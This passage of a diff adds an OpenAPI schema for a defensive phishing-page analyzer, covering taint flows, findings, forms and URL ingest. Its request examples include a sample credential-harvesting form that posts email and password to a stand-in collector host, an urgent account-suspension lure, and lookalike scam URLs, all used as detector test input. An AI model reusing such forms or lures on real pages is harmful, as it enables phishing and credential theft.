+            "type": "array",
+            "title": "Sinks Found"
+          },
+          "flows": {
+            "items": {
+              "$ref": "#/components/schemas/Flow"
+            },
+            "type": "array",
+            "title": "Flows"
+          },
+          "findings": {
+            "items": {
+              "$ref": "#/components/schemas/Finding"
+            },
+            "type": "array",
+            "title": "Findings"
+          },
+          "intent_vector": {
+            "additionalProperties": {
+              "anyOf": [
+                {
+                  "type": "number"
+                },
+                {
+                  "type": "integer"
+                }
+              ]
+            },
+            "type": "object",
+            "title": "Intent Vector"
+          },
+          "behavior_risk_score": {
+            "type": "number",
+            "title": "Behavior Risk Score",
+            "default": 0.0
+          },
+          "top_findings": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Top Findings"
+          },
+          "errors": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Errors"
+          },
+          "limitations": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Limitations"
+          }
+        },
+        "additionalProperties": false,
+        "type": "object",
+        "required": [
+          "meta",
+          "feature_set_version"
+        ],
+        "title": "BehaviorResult",
+        "description": "Part 8 output for one page."
+      },
+      "BehaviorSummary": {
+        "properties": {
+          "scripts_analyzed": {
+            "type": "integer",
+            "title": "Scripts Analyzed",
+            "default": 0
+          },
+          "scripts_lexical": {
+            "type": "integer",
+            "title": "Scripts Lexical",
+            "default": 0
+          },
+          "library_scripts_skipped": {
+            "type": "integer",
+            "title": "Library Scripts Skipped",
+            "default": 0
+          },
+          "sources_total": {
+            "type": "integer",
+            "title": "Sources Total",
+            "default": 0
+          },
+          "sinks_total": {
+            "type": "integer",
+            "title": "Sinks Total",
+            "default": 0
+          },
+          "flows_total": {
+            "type": "integer",
+            "title": "Flows Total",
+            "default": 0
+          },
+          "sources_by_id": {
+            "additionalProperties": {
+              "type": "integer"
+            },
+            "type": "object",
+            "title": "Sources By Id"
+          },
+          "sinks_by_id": {
+            "additionalProperties": {
+              "type": "integer"
+            },
+            "type": "object",
+            "title": "Sinks By Id"
+          },
+          "findings_by_severity": {
+            "additionalProperties": {
+              "type": "integer"
+            },
+            "type": "object",
+            "title": "Findings By Severity"
+          },
+          "max_severity": {
+            "anyOf": [
+              {
+                "type": "string",
+                "enum": [
+                  "critical",
+                  "high",
+                  "medium",
+                  "low"
+                ]
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Max Severity"
+          },
+          "passes": {
+            "type": "integer",
+            "title": "Passes",
+            "default": 0
+          }
+        },
+        "additionalProperties": false,
+        "type": "object",
+        "title": "BehaviorSummary"
+      },
+      "Button": {
+        "properties": {
+          "type": {
+            "type": "string",
+            "title": "Type"
+          },
+          "text": {
+            "type": "string",
+            "title": "Text",
+            "default": ""
+          },
+          "value": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Value"
+          }
+        },
+        "type": "object",
+        "required": [
+          "type"
+        ],
+        "title": "Button"
+      },
+      "CommentSummary": {
+        "properties": {
+          "count": {
+            "type": "integer",
+            "title": "Count",
+            "default": 0
+          },
+          "total_chars": {
+            "type": "integer",
+            "title": "Total Chars",
+            "default": 0
+          },
+          "samples": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Samples"
+          }
+        },
+        "type": "object",
+        "title": "CommentSummary",
+        "description": "HTML comments are removed from the content but counted (kits often leave some)."
+      },
+      "ContentRequest": {
+        "properties": {
+          "html": {
+            "type": "string",
+            "title": "Html",
+            "description": "the page's HTML (larger than 5 MB is truncated)"
+          },
+          "url": {
+            "anyOf": [
+              {
+                "type": "string",
+                "maxLength": 8192
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Url",
+            "description": "page address, never fetched"
+          }
+        },
+        "type": "object",
+        "required": [
+          "html"
+        ],
+        "title": "ContentRequest",
+        "description": "Input to ``POST /api/v1/content`` (same fields as /preprocess).",
+        "examples": [
+          {
+            "html": "<html><head><title>Verify your account</title></head><body><h1>Account suspended</h1><p>Sign in within 24 hours.</p><form action=\"https://collector.example/login.php\" method=\"post\"><input type=\"email\" name=\"email\"><input type=\"password\" name=\"pass\"><button>Sign in</button></form></body></html>",
+            "url": "https://bank.example/login"
+          },
+          {
+            "html": "<html lang=\"si\"><title>ගිණුම් අනතුරු ඇඟවීම</title><h1>හදිසි දැනුම්දීමයි!</h1><p>ඔබගේ බැංකු ගිණුම පැය 24ක් ඇතුළත අත්හිටුවනු ලැබේ.</p><a class=\"btn\" href=\"/v\">දැන් තහවුරු කරන්න</a></html>"
+          }
+        ]
+      },
+      "CountItem": {
+        "properties": {
+          "key": {
+            "type": "string",
+            "title": "Key"
+          },
+          "count": {
+            "type": "integer",
+            "title": "Count"
+          }
+        },
+        "type": "object",
+        "required": [
+          "key",
+          "count"
+        ],
+        "title": "CountItem"
+      },
+      "CssSummary": {
+        "properties": {
+          "inline_style_blocks_count": {
+            "type": "integer",
+            "title": "Inline Style Blocks Count",
+            "default": 0
+          },
+          "inline_style_total_chars": {
+            "type": "integer",
+            "title": "Inline Style Total Chars",
+            "default": 0
+          },
+          "style_attribute_count": {
+            "type": "integer",
+            "title": "Style Attribute Count",
+            "default": 0
+          },
+          "external_stylesheets": {
+            "items": {
+              "$ref": "#/components/schemas/Stylesheet"
+            },
+            "type": "array",
+            "title": "External Stylesheets"
+          }
+        },
+        "type": "object",
+        "title": "CssSummary",
+        "description": "CSS is summarised, not kept. style=\"\" attributes stay in the DOM for Part 3."
+      },
+      "DataBlock": {
+        "properties": {
+          "type": {
+            "type": "string",
+            "title": "Type"
+          },
+          "chars": {
+            "type": "integer",
+            "title": "Chars"
+          },
+          "content": {
+            "type": "string",
+            "title": "Content"
+          }
+        },
+        "type": "object",
+        "required": [
+          "type",
+          "chars",
+          "content"
+        ],
+        "title": "DataBlock",
+        "description": "A <script> that is data, not code: JSON-LD, JSON, or an HTML template."
+      },
+      "Detection": {
+        "properties": {
+          "api": {
+            "type": "string",
+            "title": "Api"
+          },
+          "category": {
+            "type": "string",
+            "title": "Category"
+          },
+          "source": {
+            "type": "string",
+            "enum": [
+              "inline",
+              "event_handler",
+              "javascript_url"
+            ],
+            "title": "Source"
+          },
+          "script_index": {
+            "type": "integer",
+            "title": "Script Index"
+          },
+          "line": {
+            "type": "integer",
+            "title": "Line"
+          },
+          "column": {
+            "type": "integer",
+            "title": "Column"
+          },
+          "end_line": {
+            "type": "integer",
+            "title": "End Line"
+          },
+          "start_byte": {
+            "type": "integer",
+            "title": "Start Byte"
+          },
+          "end_byte": {
+            "type": "integer",
+            "title": "End Byte"
+          },
+          "access": {
+            "type": "string",
+            "enum": [
+              "call",
+              "read",
+              "write",
+              "assign",
+              "construct",
+              "listener"
+            ],
+            "title": "Access"
+          },
+          "snippet": {
+            "type": "string",
+            "title": "Snippet"
+          },
+          "callee": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Callee"
+          },
+          "member": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Member"
+          },
+          "args": {
+            "anyOf": [
+              {
+                "$ref": "#/components/schemas/DetectionArgs"
+              },
+              {
+                "type": "null"
+              }
+            ]
+          },
+          "selector": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Selector"
+          },
+          "target": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Target"
+          },
+          "event_type": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Event Type"
+          },
+          "assigned_to": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Assigned To"
+          },
+          "enclosing_function": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Enclosing Function"
+          },
+          "credential_hint": {
+            "type": "boolean",
+            "title": "Credential Hint",
+            "default": false
+          },
+          "in_library": {
+            "type": "boolean",
+            "title": "In Library",
+            "default": false
+          },
+          "confidence": {
+            "type": "string",
+            "enum": [
+              "high",
+              "low"
+            ],
+            "title": "Confidence",
+            "default": "high"
+          },
+          "node_type": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Node Type"
+          }
+        },
+        "additionalProperties": false,
+        "type": "object",
+        "required": [
+          "api",
+          "category",
+          "source",
+          "script_index",
+          "line",
+          "column",
+          "end_line",
+          "start_byte",
+          "end_byte",
+          "access",
+          "snippet"
+        ],
+        "title": "Detection",
+        "description": "One API usage found in a script (evidence only - no verdict)."
+      },
+      "DetectionArgs": {
+        "properties": {
+          "first_arg_kind": {
+            "type": "string",
+            "enum": [
+              "string_literal",
+              "template",
+              "identifier",
+              "member",
+              "call",
+              "other",
+              "none"
+            ],
+            "title": "First Arg Kind",
+            "default": "none"
+          },
+          "literal_value": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Literal Value"
+          },
+          "concatenated": {
+            "type": "boolean",
+            "title": "Concatenated",
+            "default": false
+          },
+          "url": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Url"
+          },
+          "url_domain": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Url Domain"
+          },
+          "url_is_external": {
+            "anyOf": [
+              {
+                "type": "boolean"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Url Is External"
+          },
+          "http_method": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Http Method"
+          },
+          "identifiers_used": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Identifiers Used"
+          }
+        },
+        "additionalProperties": false,
+        "type": "object",
+        "title": "DetectionArgs",
+        "description": "What a call / assignment was given (the first argument, or the assigned value)."
+      },
+      "DomResult": {
+        "properties": {
+          "sample_id": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Sample Id"
+          },
+          "dataset_version": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Dataset Version"
+          },
+          "feature_set_version": {
+            "type": "string",
+            "title": "Feature Set Version"
+          },
+          "dictionary_hash": {
+            "type": "string",
+            "title": "Dictionary Hash"
+          },
+          "source_sha256": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Source Sha256"
+          },
+          "tree_source": {
+            "type": "string",
+            "enum": [
+              "html",
+              "parsed_page"
+            ],
+            "title": "Tree Source",
+            "default": "html"
+          },
+          "features": {
+            "additionalProperties": {
+              "anyOf": [
+                {
+                  "type": "number"
+                },
+                {
+                  "type": "integer"
+                }
+              ]
+            },
+            "type": "object",
+            "title": "Features"
+          },
+          "evidence": {
+            "items": {
+              "$ref": "#/components/schemas/c2_analyzer__schemas__dom__EvidenceItem"
+            },
+            "type": "array",
+            "title": "Evidence"
+          },
+          "errors": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Errors"
+          },
+          "warnings": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Warnings"
+          },
+          "processing_ms": {
+            "type": "number",
+            "title": "Processing Ms",
+            "default": 0.0
+          }
+        },
+        "type": "object",
+        "required": [
+          "feature_set_version",
+          "dictionary_hash",
+          "features"
+        ],
+        "title": "DomResult",
+        "description": "Part 3 output for one page."
+      },
+      "DomSummary": {
+        "properties": {
+          "node_count": {
+            "type": "integer",
+            "title": "Node Count",
+            "default": 0
+          },
+          "element_count": {
+            "type": "integer",
+            "title": "Element Count",
+            "default": 0
+          },
+          "max_depth": {
+            "type": "integer",
+            "title": "Max Depth",
+            "default": 0
+          },
+          "tag_counts": {
+            "additionalProperties": {
+              "type": "integer"
+            },
+            "type": "object",
+            "title": "Tag Counts"
+          },
+          "skeleton": {
+            "anyOf": [
+              {
+                "$ref": "#/components/schemas/SkeletonNode"
+              },
+              {
+                "type": "null"
+              }
+            ]
+          }
+        },
+        "type": "object",
+        "title": "DomSummary"
+      },
+      "Embedded": {
+        "properties": {
+          "tag": {
+            "type": "string",
+            "title": "Tag"
+          },
+          "src_abs": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Src Abs"
+          },
+          "domain": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Domain"
+          },
+          "is_external": {
+            "type": "boolean",
+            "title": "Is External",
+            "default": false
+          },
+          "width": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Width"
+          },
+          "height": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Height"
+          },
+          "hidden": {
+            "type": "boolean",
+            "title": "Hidden",
+            "default": false
+          }
+        },
+        "type": "object",
+        "required": [
+          "tag"
+        ],
+        "title": "Embedded",
+        "description": "<iframe>, <frame>, <object> or <embed>."
+      },
+      "EventHandler": {
+        "properties": {
+          "tag": {
+            "type": "string",
+            "title": "Tag"
+          },
+          "attribute": {
+            "type": "string",
+            "title": "Attribute"
+          },
+          "code": {
+            "type": "string",
+            "title": "Code"
+          }
+        },
+        "type": "object",
+        "required": [
+          "tag",
+          "attribute",
+          "code"
+        ],
+        "title": "EventHandler"
+      },
+      "EvidenceStep": {
+        "properties": {
+          "kind": {
+            "type": "string",
+            "title": "Kind"
+          },
+          "line": {
+            "anyOf": [
+              {
+                "type": "integer"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Line"
+          },
+          "code": {
+            "type": "string",
+            "title": "Code"
+          },
+          "note": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Note"
+          }
+        },
+        "type": "object",
+        "required": [
+          "kind",
+          "code"
+        ],
+        "title": "EvidenceStep",
+        "description": "One numbered line of a behavior finding's source -> sink chain (Part 8)."
+      },
+      "Explanation": {
+        "properties": {
+          "verdict_source": {
+            "type": "string",
+            "enum": [
+              "fusion",
+              "evidence_floor",
+              "none"
+            ],
+            "title": "Verdict Source",
+            "default": "none"
+          },
+          "explained_class": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Explained Class"
+          },
+          "method": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Method"
+          },
+          "arm_contributions": {
+            "additionalProperties": {
+              "type": "number"
+            },
+            "type": "object",
+            "title": "Arm Contributions"
+          },
+          "driving_arm": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Driving Arm"
+          },
+          "top_features": {
+            "items": {
+              "$ref": "#/components/schemas/FeatureDriver"
+            },
+            "type": "array",
+            "title": "Top Features"
+          },
+          "evidence_floor_rules": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Evidence Floor Rules"
+          },
+          "arms_used": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Arms Used"
+          },
+          "thresholds": {
+            "additionalProperties": true,
+            "type": "object",
+            "title": "Thresholds"
+          }
+        },
+        "type": "object",
+        "title": "Explanation",
+        "description": "Why the fused model said what it said (arm level + top inputs)."
+      },
+      "ExternalScript": {
+        "properties": {
+          "src_raw": {
+            "type": "string",
+            "title": "Src Raw"
+          },
+          "src_abs": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Src Abs"
+          },
+          "domain": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Domain"
+          },
+          "is_external": {
+            "type": "boolean",
+            "title": "Is External",
+            "default": false
+          },
+          "async": {
+            "type": "boolean",
+            "title": "Async",
+            "default": false
+          },
+          "defer": {
+            "type": "boolean",
+            "title": "Defer",
+            "default": false
+          },
+          "type": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Type"
+          },
+          "has_integrity": {
+            "type": "boolean",
+            "title": "Has Integrity",
+            "default": false
+          },
+          "crossorigin": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Crossorigin"
+          }
+        },
+        "type": "object",
+        "required": [
+          "src_raw"
+        ],
+        "title": "ExternalScript"
+      },
+      "ExternalScriptInfo": {
+        "properties": {
+          "index": {
+            "type": "integer",
+            "title": "Index"
+          },
+          "src": {
+            "type": "string",
+            "title": "Src"
+          },
+          "domain": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Domain"
+          },
+          "is_external": {
+            "type": "boolean",
+            "title": "Is External",
+            "default": false
+          },
+          "is_async": {
+            "type": "boolean",
+            "title": "Is Async",
+            "default": false
+          },
+          "defer": {
+            "type": "boolean",
+            "title": "Defer",
+            "default": false
+          },
+          "has_integrity": {
+            "type": "boolean",
+            "title": "Has Integrity",
+            "default": false
+          },
+          "known_cdn": {
+            "type": "boolean",
+            "title": "Known Cdn",
+            "default": false
+          },
+          "library": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Library"
+          },
+          "flags": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Flags"
+          },
+          "suspicious_host": {
+            "type": "boolean",
+            "title": "Suspicious Host",
+            "default": false
+          }
+        },
+        "additionalProperties": false,
+        "type": "object",
+        "required": [
+          "index",
+          "src"
+        ],
+        "title": "ExternalScriptInfo",
+        "description": "A <script src> reference. Its CONTENT is never fetched (static mode)."
+      },
+      "FeatureDriver": {
+        "properties": {
+          "arm": {
+            "type": "string",
+            "title": "Arm"
+          },
+          "feature": {
+            "type": "string",
+            "title": "Feature"
+          },
+          "value": {
+            "type": "number",
+            "title": "Value"
+          },
+          "contribution": {
+            "type": "number",
+            "title": "Contribution"
+          },
+          "text": {
+            "type": "string",
+            "title": "Text"
+          }
+        },
+        "type": "object",
+        "required": [
+          "arm",
+          "feature",
+          "value",
+          "contribution",
+          "text"
+        ],
+        "title": "FeatureDriver"
+      },
+      "Finding": {
+        "properties": {
+          "pattern_id": {
+            "type": "string",
+            "title": "Pattern Id"
+          },
+          "name": {
+            "type": "string",
+            "title": "Name"
+          },
+          "variant": {
+            "type": "string",
+            "title": "Variant"
+          },
+          "severity": {
+            "type": "string",
+            "enum": [
+              "critical",
+              "high",
+              "medium",
+              "low"
+            ],
+            "title": "Severity"
+          },
+          "severity_score": {
+            "type": "integer",
+            "title": "Severity Score"
+          },
+          "confidence": {
+            "type": "string",
+            "enum": [
+              "high",
+              "medium",
+              "low"
+            ],
+            "title": "Confidence"
+          },
+          "message": {
+            "type": "string",
+            "title": "Message"
+          },
+          "count": {
+            "type": "integer",
+            "title": "Count",
+            "default": 1
+          },
+          "script_index": {
+            "anyOf": [
+              {
+                "type": "integer"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Script Index"
+          },
+          "factors": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Factors"
+          },
+          "flow_ids": {
+            "items": {
+              "type": "integer"
+            },
+            "type": "array",
+            "title": "Flow Ids"
+          },
+          "evidence": {
+            "items": {
+              "$ref": "#/components/schemas/c2_analyzer__schemas__behavior__EvidenceItem"
+            },
+            "type": "array",
+            "title": "Evidence"
+          }
+        },
+        "additionalProperties": false,
+        "type": "object",
+        "required": [
+          "pattern_id",
+          "name",
+          "variant",
+          "severity",
+          "severity_score",
+          "confidence",
+          "message"
+        ],
+        "title": "Finding",
+        "description": "A behavioral pattern found on the page (configs/behavior_patterns.yaml)."
+      },
+      "Flow": {
+        "properties": {
+          "id": {
+            "type": "integer",
+            "title": "Id"
+          },
+          "source_id": {
+            "type": "string",
+            "title": "Source Id"
+          },
+          "source_ref": {
+            "type": "integer",
+            "title": "Source Ref"
+          },
+          "sink_id": {
+            "type": "string",
+            "title": "Sink Id"
+          },
+          "sink_ref": {
+            "type": "integer",
+            "title": "Sink Ref"
+          },
+          "sink_api": {
+            "type": "string",
+            "title": "Sink Api"
+          },
+          "script_index": {
+            "type": "integer",
+            "title": "Script Index"
+          },
+          "path": {
+            "items": {
+              "$ref": "#/components/schemas/FlowStep"
+            },
+            "type": "array",
+            "title": "Path"
+          },
+          "confidence": {
+            "type": "string",
+            "enum": [
+              "high",
+              "medium",
+              "low"
+            ],
+            "title": "Confidence",
+            "default": "high"
+          },
+          "encoded": {
+            "type": "boolean",
+            "title": "Encoded",
+            "default": false
+          },
+          "encodings": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Encodings"
+          },
+          "via_function": {
+            "type": "boolean",
+            "title": "Via Function",
+            "default": false
+          },
+          "sink_url_domain": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Sink Url Domain"
+          },
+          "sink_is_external": {
+            "anyOf": [
+              {
+                "type": "boolean"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Sink Is External"
+          },
+          "sink_is_known_exfil_endpoint": {
+            "type": "boolean",
+            "title": "Sink Is Known Exfil Endpoint",
+            "default": false
+          },
+          "known_endpoint": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Known Endpoint"
+          },
+          "truncated": {
+            "type": "boolean",
+            "title": "Truncated",
+            "default": false
+          }
+        },
+        "additionalProperties": false,
+        "type": "object",
+        "required": [
+          "id",
+          "source_id",
+          "source_ref",
+          "sink_id",
+          "sink_ref",
+          "sink_api",
+          "script_index"
+        ],
+        "title": "Flow",
+        "description": "A source that reaches a sink (lightweight intra-page taint analysis)."
+      },
+      "FlowStep": {
+        "properties": {
+          "step": {
+            "type": "string",
+            "enum": [
+              "source",
+              "assign",
+              "concat",
+              "call",
+              "encode",
+              "sink"
+            ],
+            "title": "Step"
+          },
+          "script_index": {
+            "type": "integer",
+            "title": "Script Index"
+          },
+          "line": {
+            "type": "integer",
+            "title": "Line"
+          },
+          "column": {
+            "type": "integer",
+            "title": "Column"
+          },
+          "code": {
+            "type": "string",
+            "title": "Code"
+          },
+          "note": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Note"
+          }
+        },
+        "additionalProperties": false,
+        "type": "object",
+        "required": [
+          "step",
+          "script_index",
+          "line",
+          "column",
+          "code"
+        ],
+        "title": "FlowStep",
+        "description": "One step of an evidence chain (what a person reads to follow the data)."
+      },
+      "Form": {
+        "properties": {
+          "index": {
+            "type": "integer",
+            "title": "Index"
+          },
+          "action_raw": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Action Raw"
+          },
+          "action_abs": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Action Abs"
+          },
+          "action_domain": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Action Domain"
+          },
+          "is_external_action": {
+            "type": "boolean",
+            "title": "Is External Action",
+            "default": false
+          },
+          "method": {
+            "type": "string",
+            "title": "Method",
+            "default": "GET"
+          },
+          "enctype": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Enctype"
+          },
+          "id": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Id"
+          },
+          "name": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Name"
+          },
+          "inputs": {
+            "items": {
+              "$ref": "#/components/schemas/InputField"
+            },
+            "type": "array",
+            "title": "Inputs"
+          },
+          "buttons": {
+            "items": {
+              "$ref": "#/components/schemas/Button"
+            },
+            "type": "array",
+            "title": "Buttons"
+          }
+        },
+        "type": "object",
+        "required": [
+          "index"
+        ],
+        "title": "Form"
+      },
+      "HTTPValidationError": {
+        "properties": {
+          "detail": {
+            "items": {
+              "$ref": "#/components/schemas/ValidationError"
+            },
+            "type": "array",
+            "title": "Detail"
+          }
+        },
+        "type": "object",
+        "title": "HTTPValidationError"
+      },
+      "Heading": {
+        "properties": {
+          "level": {
+            "type": "integer",
+            "maximum": 6.0,
+            "minimum": 1.0,
+            "title": "Level"
+          },
+          "text": {
+            "type": "string",
+            "title": "Text"
+          }
+        },
+        "type": "object",
+        "required": [
+          "level",
+          "text"
+        ],
+        "title": "Heading"
+      },
+      "IngestItem": {
+        "properties": {
+          "url": {
+            "type": "string",
+            "maxLength": 8192,
+            "title": "Url",
+            "description": "http(s) URL, <= 2,048 characters"
+          },
+          "source_ref": {
+            "anyOf": [
+              {
+                "$ref": "#/components/schemas/SourceRef"
+              },
+              {
+                "type": "null"
+              }
+            ]
+          }
+        },
+        "type": "object",
+        "required": [
+          "url"
+        ],
+        "title": "IngestItem"
+      },
+      "IngestRequest": {
+        "properties": {
+          "urls": {
+            "items": {
+              "$ref": "#/components/schemas/IngestItem"
+            },
+            "type": "array",
+            "maxItems": 500,
+            "minItems": 1,
+            "title": "Urls"
+          },
+          "source": {
+            "type": "string",
+            "const": "threatradar_push",
+            "title": "Source",
+            "default": "threatradar_push"
+          }
+        },
+        "additionalProperties": false,
+        "type": "object",
+        "required": [
+          "urls"
+        ],
+        "title": "IngestRequest",
+        "description": "Body of ``POST /api/v1/ingest``.",
+        "examples": [
+          {
+            "source": "threatradar_push",
+            "urls": [
+              {
+                "source_ref": {
+                  "channel": "lk_deals",
+                  "message_id": 4521
+                },
+                "url": "https://paypa1-secure-login.com/verify"
+              },
+              {
+                "source_ref": {
+                  "post_id": "1abcde",
+                  "subreddit": "CryptoScams"
+                },
+                "url": "https://usdt-double.xyz/"
+              }
+            ]
+          }
+        ]
+      },
+      "IngestResponse": {
+        "properties": {
+          "accepted": {
+            "type": "integer",
+            "title": "Accepted"
+          },
+          "duplicates": {
+            "type": "integer",
+            "title": "Duplicates"
+          },
+          "rejected": {
+            "items": {
+              "$ref": "#/components/schemas/RejectedUrl"
+            },
+            "type": "array",
+            "title": "Rejected"
+          },
+          "job_ids": {
+            "items": {
+              "type": "integer"
+            },
+            "type": "array",
+            "title": "Job Ids"
+          },
+          "queue_depth": {
+            "type": "integer",
+            "title": "Queue Depth",
+            "default": 0
+          }
+        },
+        "type": "object",
+        "required": [
+          "accepted",
+          "duplicates"
+        ],
+        "title": "IngestResponse",
+        "description": "202: the URLs are queued; results appear in /api/v1/scans and the live feed."
+      },
+      "InlineScript": {
+        "properties": {
+          "index": {
+            "type": "integer",
+            "title": "Index"
+          },
+          "type": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Type"
+          },
+          "chars": {
+            "type": "integer",
+            "title": "Chars"
+          },
+          "content": {
+            "type": "string",
+            "title": "Content"
+          },
+          "content_truncated": {
+            "type": "boolean",
+            "title": "Content Truncated",
+            "default": false
+          },
+          "position": {
+            "type": "string",
+            "enum": [
+              "head",
+              "body"
+            ],
+            "title": "Position"
+          }
+        },
+        "type": "object",
+        "required": [
+          "index",
+          "chars",
+          "content",
+          "position"
+        ],
+        "title": "InlineScript"
+      },
+      "InputField": {
+        "properties": {
+          "tag": {
+            "type": "string",
+            "enum": [
+              "input",
+              "select",
+              "textarea"
+            ],
+            "title": "Tag"
+          },
+          "type": {
+            "type": "string",
+            "title": "Type"
+          },
+          "name": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Name"
+          },
+          "id": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Id"
+          },
+          "placeholder": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Placeholder"
+          },
+          "autocomplete": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Autocomplete"
+          },
+          "required": {
+            "type": "boolean",
+            "title": "Required",
+            "default": false
+          },
+          "hidden": {
+            "type": "boolean",
+            "title": "Hidden",
+            "default": false
+          },
+          "maxlength": {
+            "anyOf": [
+              {
+                "type": "integer"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Maxlength"
+          },
+          "label_text": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Label Text"
+          },
+          "value_present": {
+            "type": "boolean",
+            "title": "Value Present",
+            "default": false
+          },
+          "value_masked": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Value Masked"
+          }
+        },
+        "type": "object",
+        "required": [
+          "tag",
+          "type"
+        ],
+        "title": "InputField",
+        "description": "One <input>, <select> or <textarea>."
+      },
+      "JavascriptUrl": {
+        "properties": {
+          "tag": {
+            "type": "string",
+            "title": "Tag"
+          },
+          "attribute": {
+            "type": "string",
+            "title": "Attribute"
+          },
+          "code": {
+            "type": "string",
